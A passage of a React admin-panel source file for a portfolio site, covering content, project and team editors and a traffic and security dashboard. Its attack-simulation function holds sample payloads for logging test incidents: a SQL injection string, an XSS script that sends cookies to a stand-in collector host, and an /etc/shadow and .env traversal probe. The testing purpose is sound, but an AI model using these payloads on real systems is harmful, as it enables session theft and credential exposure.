import React, { useState, useEffect, useCallback } from 'react';
import {
  LayoutDashboard, FileText, Video, Settings, LogOut, FolderOpen,
  Save, RefreshCw, ChevronRight, Edit3, Trash2, Loader2, Camera, ShieldCheck,
  Plus, X, Star, Upload, Globe, Github as GithubIcon, Tag, Image as ImageIcon,
  Radio, ShieldAlert, Users, Eye, Server, Activity,
  Calendar, Layers, Sparkles, Send, CheckCircle, Clock, UserPlus,
  Laptop, Smartphone, Tablet, Search, Zap, Flame, Filter, Menu, Lock
} from 'lucide-react';
import { IDLE_LIMIT_MS, MAX_SESSION_MS } from '../../hooks/useAdminSession';

const API_BASE = import.meta.env.VITE_API_URL || 'http://localhost:5000';

const UnstopIcon = ({ className = 'w-3 h-3' }: { className?: string }) => (
  <svg role="img" viewBox="0 0 24 24" fill="currentColor" className={className} aria-hidden="true">
    <path d="M12 0C5.394 0 0 5.394 0 12s5.394 12 12 12 12-5.394 12-12S18.606 0 12 0Zm-1.2 16.86H8.303v-1.127c-.715 1.091-1.588 1.552-2.897 1.552-2.085 0-3.248-1.2-3.248-3.333V7.248h2.509v6.182c0 1.164.533 1.722 1.6 1.722 1.224 0 2.012-.752 2.012-1.891V7.236h2.509v9.625zm8.533 0v-5.939c0-1.14-.533-1.721-1.6-1.721-1.224 0-2.012.752-2.012 1.89v5.77h-2.509V7.237h2.497V8.63c.715-1.09 1.588-1.551 2.897-1.551 2.085 0 3.249 1.2 3.249 3.333v6.449z" />
  </svg>
);

interface AdminPanelProps {
  token: string;
  user: any;
  onLogout: () => void;
}

interface ContentItem {
  key: string;
  value: any;
  label: string;
  fieldType: string;
  updatedAt?: string;
}

export interface TeamMemberInput {
  name: string;
  role: string;
  contribution: string;
  avatar?: string;
  github?: string;
}

export interface TimelinePhaseInput {
  phase: string;
  title: string;
  description: string;
  completed: boolean;
}

interface ProjectFormData {
  title: string;
  shortDescription: string;
  description: string;
  category: string;
  status: string;
  technologies: string;
  tags: string;
  githubUrl: string;
  liveUrl: string;
  featured: boolean;
  image: File | null;
  startDate: string;
  projectType: 'Solo Project' | 'Team Project' | 'Group Collaboration';
  toolsUsed: string;
  howCompleted: string;
  futureScope: string;
  teamMembers: TeamMemberInput[];
  timelinePhases: TimelinePhaseInput[];
}

const EMPTY_PROJECT_FORM: ProjectFormData = {
  title: '',
  shortDescription: '',
  description: '',
  category: 'AI/ML',
  status: 'In Progress',
  technologies: '',
  tags: '',
  githubUrl: '',
  liveUrl: '',
  featured: false,
  image: null,
  startDate: 'October 2024',
  projectType: 'Solo Project',
  toolsUsed: 'PyTorch, Gemini Flash, React 18, Vite, Node.js',
  howCompleted: 'Architected with full cosmic visual design, modular micro-components, custom canvas animations, and resilient offline local stores.',
  futureScope: 'Expand automated multi-agent capabilities\nIntegrate live edge deployment\nImplement multi-modal sensory inputs',
  teamMembers: [
    { name: 'Nilanjan Nayak', role: 'Lead Architect & AI Engineer', contribution: 'Full system architecture, cosmic UI, model development' }
  ],
  timelinePhases: [
    { phase: 'Phase 1', title: 'Conceptualization & Research', description: 'Defined architecture and tech stack', completed: true },
    { phase: 'Phase 2', title: 'Core Development', description: 'Implemented models and responsive UI', completed: true },
    { phase: 'Phase 3', title: 'Testing & Deployment', description: 'Optimized performance and deployed to production', completed: false }
  ]
};

const CATEGORIES = ['AI/ML', 'Web Development', 'Mobile App', 'Data Science', 'IoT', 'Blockchain', 'storage', 'Other'];
const STATUSES = ['In Progress', 'Completed', 'On Hold', 'Planning'];
const PROJECT_TYPES: ('Solo Project' | 'Team Project' | 'Group Collaboration')[] = [
  'Solo Project',
  'Team Project',
  'Group Collaboration'
];

type Tab = 'overview' | 'content' | 'projects' | 'team' | 'traffic' | 'videos' | 'settings';

const AdminPanel: React.FC<AdminPanelProps> = ({ token, user, onLogout }) => {
  const [activeTab, setActiveTab] = useState<Tab>('overview');
  const [contentSchema, setContentSchema] = useState<Record<string, ContentItem[]>>({});
  const [editValues, setEditValues] = useState<Record<string, any>>({});
  const [saving, setSaving] = useState(false);
  const [saveMessage, setSaveMessage] = useState('');
  const [loading, setLoading] = useState(true);
  const [projects, setProjects] = useState<any[]>([]);

  // Project editor state
  const [showProjectForm, setShowProjectForm] = useState(false);
  const [editingProjectId, setEditingProjectId] = useState<string | null>(null);
  const [projectForm, setProjectForm] = useState<ProjectFormData>(EMPTY_PROJECT_FORM);
  const [projectSaving, setProjectSaving] = useState(false);
  const [imagePreview, setImagePreview] = useState<string | null>(null);

  // Team editor state
  const [teamMembers, setTeamMembers] = useState<any[]>([]);
  const [showTeamForm, setShowTeamForm] = useState(false);
  const [editingMemberId, setEditingMemberId] = useState<string | null>(null);
  const [teamForm, setTeamForm] = useState<any>({
    name: '',
    role: '',
    category: 'hackathon',
    badge: '',
    tagline: '',
    avatarUrl: '',
    bio: '',
    skills: '',
    website: '',
    github: '',
    linkedin: '',
    email: '',
    unstop: '',
    competitionName: '',
    competitionYear: '',
    competitionTrack: '',
    competitionOutcome: '',
    projectTitle: '',
    projectRole: '',
    projectHighlights: ''
  });
  const [teamSaving, setTeamSaving] = useState(false);

  // Live Traffic & Security Radar State
  const [trafficData, setTrafficData] = useState<any>(null);
  const [trafficLoading, setTrafficLoading] = useState(false);
  const [testingAlert, setTestingAlert] = useState(false);
  const [testAlertMessage, setTestAlertMessage] = useState('');
  const [pollingInterval, setPollingInterval] = useState<number>(3500); // 3.5s real-time polling
  const [lastSyncTime, setLastSyncTime] = useState<string>('Just now');
  const [radarSearch, setRadarSearch] = useState<string>('');
  const [threatFilter, setThreatFilter] = useState<string>('ALL');
  const [simulating, setSimulating] = useState(false);
  const [simulationToast, setSimulationToast] = useState('');
  const [navOpen, setNavOpen] = useState(false);

  // Fetch live traffic
  const fetchLiveTraffic = useCallback(async () => {
    try {
      setTrafficLoading(true);
      const res = await fetch(`${API_BASE}/api/visitors/live`, {
        headers: { Authorization: `Bearer ${token}` }
      });
      if (res.ok) {
        const json = await res.json();
        if (json.success && json.data) {
          setTrafficData(json.data);
          setLastSyncTime(new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }));
        }
      }
    } catch (err) {
      console.error('Failed to fetch live traffic telemetry:', err);
    } finally {
      setTrafficLoading(false);
    }
  }, [token]);

  // Poll live traffic dynamically based on interval
  useEffect(() => {
    if (activeTab === 'traffic' || activeTab === 'overview') {
      fetchLiveTraffic();
      if (pollingInterval > 0) {
        const interval = setInterval(() => { if (!document.hidden) fetchLiveTraffic(); }, pollingInterval);
        return () => clearInterval(interval);
      }
    }
  }, [activeTab, fetchLiveTraffic, pollingInterval]);

  // Trigger test security alert email
  const handleTestSecurityAlert = async () => {
    setTestingAlert(true);
    setTestAlertMessage('');
    try {
      const res = await fetch(`${API_BASE}/api/visitors/test-security-alert`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${token}`
        }
      });
      const data = await res.json();
      if (res.ok) {
        setTestAlertMessage('🚨 Security Alert Email successfully dispatched to starailab.info@gmail.com!');
        await fetchLiveTraffic();
      } else {
        setTestAlertMessage(`❌ ${data.message || 'Failed to dispatch alert'}`);
      }
    } catch (err) {
      setTestAlertMessage('❌ Network error sending test alert');
    } finally {
      setTestingAlert(false);
      setTimeout(() => setTestAlertMessage(''), 6000);
    }
  };

  // Simulate an attack probe directly in the live radar
  const handleSimulateAttack = async (type: string, label: string) => {
    if (!confirm('This adds a FAKE security incident to your real logs (for testing only). Continue?')) return;
    setSimulating(true);
    setSimulationToast('');
    try {
      const payloads: Record<string, { threatType: string; payload: string; targetPath: string }> = {
        sqli: {
          threatType: 'SQL INJECTION (SQLi)',
          payload: "SELECT * FROM users WHERE '1'='1' UNION SELECT 1, null, password_hash FROM admin_vault",
          targetPath: '/api/projects?search=' + encodeURIComponent("' OR '1'='1")
        },
        xss: {
          threatType: 'CROSS-SITE SCRIPTING (XSS)',
          payload: `<script>document.location='https://malicious-collector.net/steal?c='+document.cookie</script>`,
          targetPath: '/api/contact'
        },
        traversal: {
          threatType: 'PATH TRAVERSAL / SECRET PROBE',
          payload: '../../../../etc/shadow || ../../.env leaked credentials probe',
          targetPath: '/.env'
        },
        scanner: {
          threatType: 'AUTOMATED VULNERABILITY SCANNER',
          payload: 'Nikto/2.1.6 (Automated Penetration Probe & Directory Brute Force)',
          targetPath: '/wp-login.php'
        }
      };

      const selected = payloads[type] || payloads.sqli;
      const res = await fetch(`${API_BASE}/api/visitors/simulate-threat`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${token}`
        },
        body: JSON.stringify(selected)
      });
      const json = await res.json();
      if (res.ok) {
        setSimulationToast(`🛡️ Intercepted ${label}: Blocked with 403 Forbidden & Alert emailed to starailab.info@gmail.com!`);
        await fetchLiveTraffic();
      } else {
        setSimulationToast(`❌ ${json.message || 'Simulation failed'}`);
      }
    } catch (e: any) {
      setSimulationToast(`❌ Error: ${e.message}`);
    } finally {
      setSimulating(false);
      setTimeout(() => setSimulationToast(''), 6000);
    }
  };

  // Simulate an external visitor referral
  const handleSimulateVisitor = async (serverSource: string, location: string, browser = 'Google Chrome', os = 'Windows', device = 'Desktop') => {
    if (!confirm('This adds a FAKE visitor to your real analytics (for testing only). Continue?')) return;
    setSimulating(true);
    try {
      const res = await fetch(`${API_BASE}/api/visitors/simulate-visit`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${token}`
        },
        body: JSON.stringify({
          serverSource,
          location,
          browser,
          os,
          device,
          path: '/projects'
        })
      });
      if (res.ok) {
        setSimulationToast(`🌐 Simulated live visitor ping from [${serverSource} - ${location}] recorded!`);
        await fetchLiveTraffic();
      }
    } catch (e: any) {
      console.error('Error simulating visit:', e);
    } finally {
      setSimulating(false);
      setTimeout(() => setSimulationToast(''), 4500);
    }
  };

  // Clear security incidents
  const handleClearAlerts = async () => {
    if (!confirm('Are you sure you want to clear all security incident logs?')) return;
    try {
      const res = await fetch(`${API_BASE}/api/visitors/security-alerts`, {
        method: 'DELETE',
        headers: { Authorization: `Bearer ${token}` }
      });
      if (res.ok) {
        await fetchLiveTraffic();
        setSaveMessage('✅ Security logs cleared');
        setTimeout(() => setSaveMessage(''), 3000);
      }
    } catch (err) {
      console.error('Error clearing alerts:', err);
    }
  };

  // Reset traffic logs
  const handleResetTraffic = async () => {
    if (!confirm('Are you sure you want to reset all visitor traffic metrics?')) return;
    try {
      const res = await fetch(`${API_BASE}/api/visitors/traffic-logs`, {
        method: 'DELETE',
        headers: { Authorization: `Bearer ${token}` }
      });
      if (res.ok) {
        await fetchLiveTraffic();
        setSaveMessage('✅ Traffic metrics reset successfully');
        setTimeout(() => setSaveMessage(''), 3000);
      }
    } catch (err) {
      console.error('Error resetting traffic logs:', err);
    }
  };

  // Fetch content schema
  const fetchContent = useCallback(async () => {
    try {
      const res = await fetch(`${API_BASE}/api/content/admin/schema`, {
        headers: { Authorization: `Bearer ${token}` }
      });
      if (res.ok) {
        const data = await res.json();
        setContentSchema(data.schema || {});
      }
    } catch (err) {
      console.error('Failed to fetch content schema:', err);
    }
  }, [token]);

  // Fetch projects
  const fetchProjects = useCallback(async () => {
    try {
      const res = await fetch(`${API_BASE}/api/projects`);
      if (res.ok) {
        const data = await res.json();
        setProjects(data.projects || []);
      }
    } catch (err) {
      console.error('Failed to fetch projects:', err);
    }
  }, []);

  // Fetch team members
  const fetchTeam = useCallback(async () => {
    try {
      const res = await fetch(`${API_BASE}/api/team`);
      if (res.ok) {
        const data = await res.json();
        setTeamMembers(data.members || []);
      }
    } catch (err) {
      console.error('Failed to fetch team members:', err);
    }
  }, []);

  useEffect(() => {
    const load = async () => {
      setLoading(true);
      await Promise.all([fetchContent(), fetchProjects(), fetchTeam()]);
      setLoading(false);
    };
    load();
  }, [fetchContent, fetchProjects, fetchTeam]);

  // Save content changes
  const saveContent = async (section: string, key: string, value: any) => {
    setSaving(true);
    setSaveMessage('');
    try {
      const res = await fetch(`${API_BASE}/api/content/${section}/${key}`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${token}`
        },
        body: JSON.stringify({ value })
      });

      if (res.ok) {
        setSaveMessage(`✅ Saved ${section}.${key}`);
        await fetchContent();
      } else {
        const data = await res.json();
        setSaveMessage(`❌ ${data.message}`);
      }
    } catch (err) {
      setSaveMessage('❌ Connection error');
    } finally {
      setSaving(false);
      setTimeout(() => setSaveMessage(''), 3000);
    }
  };

  // Delete project
  const deleteProject = async (id: string) => {
    if (!confirm('Are you sure you want to delete this project?')) return;
    try {
      const res = await fetch(`${API_BASE}/api/projects/${id}`, {
        method: 'DELETE',
        headers: { Authorization: `Bearer ${token}` }
      });
      if (res.ok) {
        await fetchProjects();
        setSaveMessage('✅ Project deleted');
        setTimeout(() => setSaveMessage(''), 3000);
      }
    } catch (err) {
      console.error('Delete error:', err);
    }
  };

  // Open the form for adding a new project
  const openAddProject = () => {
    setEditingProjectId(null);
    setProjectForm(EMPTY_PROJECT_FORM);
    setImagePreview(null);
    setShowProjectForm(true);
  };

  // Open the form for editing an existing project
  const openEditProject = (project: any) => {
    setEditingProjectId(project._id);
    setProjectForm({
      title: project.title || '',
      shortDescription: project.shortDescription || '',
      description: project.description || '',
      category: project.category || 'AI/ML',
      status: project.status || 'In Progress',
      technologies: (project.technologies || []).join(', '),
      tags: (project.tags || []).join(', '),
      githubUrl: project.githubUrl || '',
      liveUrl: project.liveUrl || '',
      featured: project.featured || false,
      image: null,
      startDate: project.startDate || 'October 2024',
      projectType: (project.projectType as any) || 'Solo Project',
      toolsUsed: Array.isArray(project.toolsUsed) ? project.toolsUsed.join(', ') : (project.toolsUsed || ''),
      howCompleted: project.howCompleted || '',
      futureScope: Array.isArray(project.futureScope) ? project.futureScope.join('\n') : (project.futureScope || ''),
      teamMembers: Array.isArray(project.teamMembers) && project.teamMembers.length > 0
        ? project.teamMembers
        : [{ name: 'Nilanjan Nayak', role: 'Lead Architect & AI Engineer', contribution: 'Full system architecture, cosmic UI, model development' }],
      timelinePhases: Array.isArray(project.timelinePhases) && project.timelinePhases.length > 0
        ? project.timelinePhases
        : [
          { phase: 'Phase 1', title: 'Conceptualization', description: 'Defined architecture and tech stack', completed: true },
          { phase: 'Phase 2', title: 'Core Development', description: 'Implemented models and responsive UI', completed: true },
          { phase: 'Phase 3', title: 'Testing & Launch', description: 'Optimized performance and deployed', completed: false }
        ]
    });
    setImagePreview(project.imageUrl ? `${API_BASE}${project.imageUrl}` : null);
    setShowProjectForm(true);
  };

  // Close form
  const closeProjectForm = () => {
    setShowProjectForm(false);
    setEditingProjectId(null);
    setProjectForm(EMPTY_PROJECT_FORM);
    setImagePreview(null);
  };

  // Sub-item modifiers
  const addTeamMember = () => {
    setProjectForm(p => ({
      ...p,
      teamMembers: [...p.teamMembers, { name: '', role: 'Contributor', contribution: '' }]
    }));
  };

  const removeTeamMember = (index: number) => {
    setProjectForm(p => ({
      ...p,
      teamMembers: p.teamMembers.filter((_, i) => i !== index)
    }));
  };

  const updateTeamMember = (index: number, field: keyof TeamMemberInput, value: string) => {
    setProjectForm(p => {
      const updated = [...p.teamMembers];
      updated[index] = { ...updated[index], [field]: value };
      return { ...p, teamMembers: updated };
    });
  };

  const addTimelinePhase = () => {
    setProjectForm(p => ({
      ...p,
      timelinePhases: [
        ...p.timelinePhases,
        { phase: `Phase ${p.timelinePhases.length + 1}`, title: '', description: '', completed: false }
      ]
    }));
  };

  const removeTimelinePhase = (index: number) => {
    setProjectForm(p => ({
      ...p,
      timelinePhases: p.timelinePhases.filter((_, i) => i !== index)
    }));
  };

  const updateTimelinePhase = (index: number, field: keyof TimelinePhaseInput, value: any) => {
    setProjectForm(p => {
      const updated = [...p.timelinePhases];
      updated[index] = { ...updated[index], [field]: value };
      return { ...p, timelinePhases: updated };
    });
  };

  // Handle image file selection
  const handleImageChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setProjectForm(prev => ({ ...prev, image: file }));
      const reader = new FileReader();
      reader.onloadend = () => setImagePreview(reader.result as string);
      reader.readAsDataURL(file);
    }
  };

  // Save project (create or update)
  const saveProject = async () => {
    if (!projectForm.title.trim() || !projectForm.description.trim() || !projectForm.shortDescription.trim()) {
      setSaveMessage('❌ Title, description, and short description are required');
      setTimeout(() => setSaveMessage(''), 3000);
      return;
    }

    setProjectSaving(true);
    setSaveMessage('');
    try {
      const formData = new FormData();
      formData.append('title', projectForm.title);
      formData.append('shortDescription', projectForm.shortDescription);
      formData.append('description', projectForm.description);
      formData.append('category', projectForm.category);
      formData.append('status', projectForm.status);
      formData.append('technologies', JSON.stringify(
        projectForm.technologies.split(',').map(t => t.trim()).filter(Boolean)
      ));
      formData.append('tags', JSON.stringify(
        projectForm.tags.split(',').map(t => t.trim()).filter(Boolean)
      ));
      formData.append('githubUrl', projectForm.githubUrl);
      formData.append('liveUrl', projectForm.liveUrl);
      formData.append('featured', String(projectForm.featured));

      // Enriched fields
      formData.append('startDate', projectForm.startDate || '');
      formData.append('projectType', projectForm.projectType || 'Solo Project');
      formData.append('toolsUsed', JSON.stringify(
        projectForm.toolsUsed.split(',').map(t => t.trim()).filter(Boolean)
      ));
      formData.append('howCompleted', projectForm.howCompleted || '');
      formData.append('futureScope', JSON.stringify(
        projectForm.futureScope.split('\n').map(s => s.trim()).filter(Boolean)
      ));
      formData.append('teamMembers', JSON.stringify(projectForm.teamMembers || []));
      formData.append('timelinePhases', JSON.stringify(projectForm.timelinePhases || []));

      if (projectForm.image) {
        formData.append('image', projectForm.image);
      }

      const url = editingProjectId
        ? `${API_BASE}/api/projects/${editingProjectId}`
        : `${API_BASE}/api/projects`;
      const method = editingProjectId ? 'PUT' : 'POST';

      const res = await fetch(url, {
        method,
        headers: { Authorization: `Bearer ${token}` },
        body: formData,
      });

      if (res.ok) {
        setSaveMessage(editingProjectId ? '✅ Project updated successfully' : '✅ Project created successfully');
        closeProjectForm();
        await fetchProjects();
      } else {
        const data = await res.json();
        const errorMsg = data.errors
          ? data.errors.map((e: any) => e.msg).join(', ')
          : data.message || 'Unknown error';
        setSaveMessage(`❌ ${errorMsg}`);
      }
    } catch (err) {
      setSaveMessage('❌ Connection error');
    } finally {
      setProjectSaving(false);
      setTimeout(() => setSaveMessage(''), 4000);
    }
  };

  // ── Team Member Handlers ──
  const openAddTeamMember = () => {
    setEditingMemberId(null);
    setTeamForm({
      name: '',
      role: '',
      category: 'hackathon',
      badge: '',
      tagline: '',
      avatarUrl: '',
      bio: '',
      skills: '',
      website: '',
      github: '',
      linkedin: '',
      email: '',
      unstop: '',
      competitionName: '',
      competitionYear: new Date().getFullYear().toString(),
      competitionTrack: '',
      competitionOutcome: '',
      projectTitle: '',
      projectRole: '',
      projectHighlights: ''
    });
    setShowTeamForm(true);
  };

  const openEditTeamMember = (member: any) => {
    setEditingMemberId(member.id);
    const comp = member.competitions?.[0] || {};
    const proj = member.projectContributions?.[0] || {};
    setTeamForm({
      name: member.name || '',
      role: member.role || '',
      category: member.category || 'hackathon',
      badge: member.badge || '',
      tagline: member.tagline || '',
      avatarUrl: member.avatarUrl || '',
      bio: member.bio || '',
      skills: Array.isArray(member.skills) ? member.skills.join(', ') : (member.skills || ''),
      website: member.socials?.portfolio || '',
      github: member.socials?.github || '',
      linkedin: member.socials?.linkedin || '',
      email: member.socials?.email || '',
      unstop: member.socials?.unstop || '',
      competitionName: comp.name || '',
      competitionYear: comp.year || '',
      competitionTrack: comp.track || '',
      competitionOutcome: comp.outcome || '',
      projectTitle: proj.project || '',
      projectRole: proj.role || '',
      projectHighlights: proj.highlights || ''
    });
    setShowTeamForm(true);
  };

  const closeTeamForm = () => {
    setShowTeamForm(false);
    setEditingMemberId(null);
  };

  const saveTeamMember = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!teamForm.name.trim() || !teamForm.role.trim()) {
      setSaveMessage('❌ Name and role are required');
      setTimeout(() => setSaveMessage(''), 3000);
      return;
    }

    setTeamSaving(true);
    try {
      const payload: any = {
        name: teamForm.name.trim(),
        role: teamForm.role.trim(),
        category: teamForm.category,
        badge: teamForm.badge.trim(),
        tagline: teamForm.tagline.trim(),
        avatarUrl: teamForm.avatarUrl.trim(),
        bio: teamForm.bio.trim(),
        skills: teamForm.skills.split(',').map((s: string) => s.trim()).filter(Boolean),
        socials: {
          portfolio: teamForm.website.trim(),
          github: teamForm.github.trim(),
          linkedin: teamForm.linkedin.trim(),
          email: teamForm.email.trim(),
          unstop: teamForm.unstop.trim()
        }
      };

      if (teamForm.competitionName) {
        payload.competitions = [{
          name: teamForm.competitionName.trim(),
          year: teamForm.competitionYear?.trim() || '2024',
          roleInCompetition: `${teamForm.role} (Star AI Lab)`,
          track: teamForm.competitionTrack?.trim() || '',
          outcome: teamForm.competitionOutcome?.trim() || ''
        }];
      }

      if (teamForm.projectTitle) {
        payload.projectContributions = [{
          project: teamForm.projectTitle.trim(),
          role: teamForm.projectRole?.trim() || teamForm.role.trim(),
          highlights: teamForm.projectHighlights?.trim() || ''
        }];
      }

      const url = editingMemberId ? `${API_BASE}/api/team/${editingMemberId}` : `${API_BASE}/api/team`;
      const method = editingMemberId ? 'PUT' : 'POST';

      const res = await fetch(url, {
        method,
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${token}`
        },
        body: JSON.stringify(payload)
      });

      if (res.ok) {
        await fetchTeam();
        setShowTeamForm(false);
        setSaveMessage(editingMemberId ? '✅ Team member updated' : '✅ Team member created');
      } else {
        const err = await res.json().catch(() => ({}));
        setSaveMessage(`❌ ${err.message || 'Error saving team member'}`);
      }
    } catch (err) {
      setSaveMessage('❌ Connection error');
    } finally {
      setTeamSaving(false);
      setTimeout(() => setSaveMessage(''), 3500);
    }
  };

  const deleteTeamMember = async (id: string, name: string) => {
    if (!confirm(`Are you sure you want to remove "${name}" from the team directory?`)) return;
    try {
      const res = await fetch(`${API_BASE}/api/team/${id}`, {
        method: 'DELETE',
        headers: { Authorization: `Bearer ${token}` }
      });
      if (res.ok) {
        await fetchTeam();
        setSaveMessage('✅ Team member removed');
        setTimeout(() => setSaveMessage(''), 3000);
      } else {
        setSaveMessage('❌ Failed to delete team member');
        setTimeout(() => setSaveMessage(''), 3000);
      }
    } catch (err) {
      setSaveMessage('❌ Connection error');
      setTimeout(() => setSaveMessage(''), 3000);
    }
  };

  const handleEditChange = (editKey: string, value: any) => {
    setEditValues(prev => ({ ...prev, [editKey]: value }));
  };

  // Render content field editor
  const renderFieldEditor = (section: string, item: ContentItem) => {
    const editKey = `${section}.${item.key}`;
    const currentValue = editValues[editKey] !== undefined ? editValues[editKey] : item.value;
    const isModified = editValues[editKey] !== undefined && JSON.stringify(editValues[editKey]) !== JSON.stringify(item.value);

    if (item.fieldType === 'textarea' || item.fieldType === 'richtext') {
      return (
        <div className="space-y-2">
          <label className="text-sm text-white/60 font-medium">{item.label || item.key}</label>
          <textarea
            value={typeof currentValue === 'string' ? currentValue : JSON.stringify(currentValue, null, 2)}
            onChange={e => handleEditChange(editKey, e.target.value)}
            className="w-full h-24 px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white/90 text-sm resize-none focus:border-cyan-400/50 focus:outline-none transition-all"
          />
          {isModified && (
            <button
              onClick={() => saveContent(section, item.key, editValues[editKey])}
              disabled={saving}
              className="px-4 py-2 bg-cyan-500/20 text-cyan-300 text-xs rounded-lg border border-cyan-500/30 hover:bg-cyan-500/30 transition-all flex items-center gap-2"
            >
              <Save className="w-3 h-3" />
              Save Changes
            </button>
          )}
        </div>
      );
    }

    if (item.fieldType === 'array' || item.fieldType === 'object' || typeof item.value === 'object') {
      return (
        <div className="space-y-2">
          <label className="text-sm text-white/60 font-medium">{item.label || item.key}</label>
          <textarea
            value={typeof currentValue === 'string' ? currentValue : JSON.stringify(currentValue, null, 2)}
            onChange={e => {
              try {
                const parsed = JSON.parse(e.target.value);
                handleEditChange(editKey, parsed);
              } catch {
                handleEditChange(editKey, e.target.value);
              }
            }}
            className="w-full h-40 px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white/90 text-xs font-mono resize-none focus:border-cyan-400/50 focus:outline-none transition-all"
          />
          {isModified && (
            <button
              onClick={() => saveContent(section, item.key, editValues[editKey])}
              disabled={saving}
              className="px-4 py-2 bg-cyan-500/20 text-cyan-300 text-xs rounded-lg border border-cyan-500/30 hover:bg-cyan-500/30 transition-all flex items-center gap-2"
            >
              <Save className="w-3 h-3" />
              Save Changes
            </button>
          )}
        </div>
      );
    }

    // Default: text/email/url/number
    return (
      <div className="space-y-2">
        <label className="text-sm text-white/60 font-medium">{item.label || item.key}</label>
        <div className="flex gap-2">
          <input
            type={item.fieldType === 'email' ? 'email' : item.fieldType === 'url' ? 'url' : 'text'}
            value={typeof currentValue === 'string' ? currentValue : String(currentValue)}
            onChange={e => handleEditChange(editKey, e.target.value)}
            className="flex-1 px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white/90 text-sm focus:border-cyan-400/50 focus:outline-none transition-all"
          />
          {isModified && (
            <button
              onClick={() => saveContent(section, item.key, editValues[editKey])}
              disabled={saving}
              className="px-4 py-3 bg-cyan-500/20 text-cyan-300 rounded-xl border border-cyan-500/30 hover:bg-cyan-500/30 transition-all"
            >
              <Save className="w-4 h-4" />
            </button>
          )}
        </div>
      </div>
    );
  };

  const sectionLabels: Record<string, string> = {
    hero: '🏠 Hero Section',
    about: '📋 About Section',
    demo: '🎬 Demo Section',
    videos: '📹 Videos',
    demoCards: '🃏 Demo Cards',
    contact: '📧 Contact',
    footer: '🦶 Footer',
    general: '⚙️ General',
    navigation: '🧭 Navigation'
  };

  const tabs: { id: Tab; label: string; icon: React.ReactNode; badge?: React.ReactNode }[] = [
    { id: 'overview', label: 'Overview', icon: <LayoutDashboard className="w-5 h-5" /> },
    { id: 'content', label: 'Content', icon: <FileText className="w-5 h-5" /> },
    { id: 'projects', label: 'Projects', icon: <FolderOpen className="w-5 h-5" /> },
    { id: 'team', label: 'Team & Squad', icon: <Users className="w-5 h-5" /> },
    {
      id: 'traffic',
      label: 'Live Radar & Security',
      icon: <Radio className="w-5 h-5 text-cyan-400" />,
      badge: (trafficData?.totalThreats || 0) > 0 ? (
        <span className="px-1.5 py-0.5 text-[9px] bg-red-500/25 text-red-300 border border-red-500/40 rounded-full font-bold ml-auto animate-pulse">
          {trafficData.totalThreats}
        </span>
      ) : (
        <span className="w-2 h-2 rounded-full bg-emerald-400 ml-auto animate-ping"></span>
      )
    },
    { id: 'videos', label: 'Videos', icon: <Video className="w-5 h-5" /> },
    { id: 'settings', label: 'Settings', icon: <Settings className="w-5 h-5" /> },
  ];

  if (loading) {
    return (
      <div className="fixed inset-0 z-[9999] bg-slate-950 flex items-center justify-center">
        <div className="text-center space-y-4">
          <Loader2 className="w-10 h-10 text-cyan-400 animate-spin mx-auto" />
          <p className="text-white/40 text-sm">Loading admin panel...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 z-[9999] bg-slate-950 flex">
      {navOpen && <div className="fixed inset-0 z-20 bg-black/60 md:hidden" onClick={() => setNavOpen(false)} />}
      {/* Sidebar */}
      <div className={`fixed inset-y-0 left-0 z-30 flex w-64 flex-shrink-0 flex-col border-r border-white/5 bg-gradient-to-b from-slate-900 to-slate-950 transition-transform duration-300 md:static md:translate-x-0 ${navOpen ? 'translate-x-0' : '-translate-x-full'}`}>
        {/* Logo */}
        <div className="p-6 border-b border-white/5">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-blue-500/20 to-cyan-400/10 border border-blue-400/20 flex items-center justify-center">
              <ShieldCheck className="w-5 h-5 text-cyan-400" />
            </div>
            <div>
              <h2 className="text-white font-bold text-sm">Admin Panel</h2>
              <p className="text-white/30 text-[10px] uppercase tracking-wider">Star AI Lab</p>
            </div>
          </div>
        </div>

        {/* Nav */}
        <nav className="flex-1 p-4 space-y-1">
          {tabs.map(tab => (
            <button
              key={tab.id}
              onClick={() => { setActiveTab(tab.id); setNavOpen(false); }}
              className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-medium transition-all ${activeTab === tab.id
                ? 'bg-blue-500/15 text-cyan-300 border border-blue-500/20'
                : 'text-white/40 hover:text-white/70 hover:bg-white/5'
                }`}
            >
              {tab.icon}
              <span className="truncate">{tab.label}</span>
              {tab.badge}
            </button>
          ))}
        </nav>

        {/* User info + logout */}
        <div className="p-4 border-t border-white/5">
          <div className="flex items-center gap-3 px-4 py-3 mb-3">
            <div className="w-8 h-8 rounded-full bg-gradient-to-br from-blue-500 to-cyan-400 flex items-center justify-center text-white text-xs font-bold">
              {user?.username?.[0]?.toUpperCase() || 'A'}
            </div>
            <div className="flex-1 min-w-0">
              <p className="text-white/80 text-sm font-medium truncate">{user?.username || 'Admin'}</p>
              <p className="text-white/30 text-[10px] truncate">{user?.email || ''}</p>
            </div>
          </div>
          <button
            onClick={onLogout}
            className="w-full flex items-center gap-3 px-4 py-3 rounded-xl text-red-400/60 hover:text-red-400 hover:bg-red-500/10 transition-all text-sm"
          >
            <LogOut className="w-4 h-4" />
            Logout
          </button>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 overflow-y-auto">
        {/* Top bar */}
        <div className="sticky top-0 z-10 bg-slate-950/80 backdrop-blur-xl border-b border-white/5 px-4 sm:px-8 py-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <button onClick={() => setNavOpen(true)} className="rounded-lg bg-white/5 p-2 text-white/60 hover:text-white md:hidden" aria-label="Open menu">
              <Menu className="h-5 w-5" />
            </button>
            <h1 className="text-xl font-bold text-white">
              {tabs.find(t => t.id === activeTab)?.label}
            </h1>
